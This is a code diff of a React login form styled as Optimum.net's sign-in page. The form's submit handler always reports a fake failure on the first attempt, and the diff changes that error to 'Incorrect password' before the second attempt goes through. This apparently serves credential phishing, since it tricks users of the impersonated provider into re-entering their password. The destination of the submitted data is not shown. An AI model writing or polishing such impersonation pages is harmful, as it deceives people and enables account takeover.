@@ -3,6 +3,7 @@ import React, { useState, useEffect } from 'react';
 const LoginForm = () => {
   const [formData, setFormData] = useState({ email: '', password: '' });
   const [error, setError] = useState('');
+  const [attemptCount, setAttemptCount] = useState(0);
 
   // Auto-fill email from localStorage
   useEffect(() => {
@@ -23,16 +24,19 @@ const LoginForm = () => {
     }
     return true;
   };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
 
+    // Validate form before proceeding
     if (!validateForm()) return;
 
     if (attemptCount === 0) {
       // Simulate failure on the first attempt
-      setError('Failed to submit. Please try again.');
+      setError('Incorrect password. Please try again.');
+      console.log('Error:', 'Incorrect password on the first attempt.');
       setAttemptCount(1); // Increment attempt count
-      return;
+      return; // Exit early to prevent actual submission
     }
 
     try {
@@ -55,8 +59,10 @@ const LoginForm = () => {
       }
     } catch (err) {
       setError('Failed to submit. Please try again later.');
+      console.error('Error:', err);
     }
   };
+
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -104,6 +110,8 @@ const LoginForm = () => {
           {error && !formData.password && (
             <p className="text-red-500 text-xs">{error}</p>
           )}
+
+          {error && <p className="text-red-500 text-xs">{error}</p>}
           <a
             href="/forgot-password"
             className="text-blue-500 text-xs font-normal font-orbit mt-2 inline-block"
@@ -124,7 +132,7 @@ const LoginForm = () => {
           Sign in to Optimum.net
         </button>
       </form>
-    
+
       <p className="text-center text-xs font-normal font-orbit mt-4">
         <a href="/create-id" className="text-blue-500">
           Don't have an Optimum ID? Create one
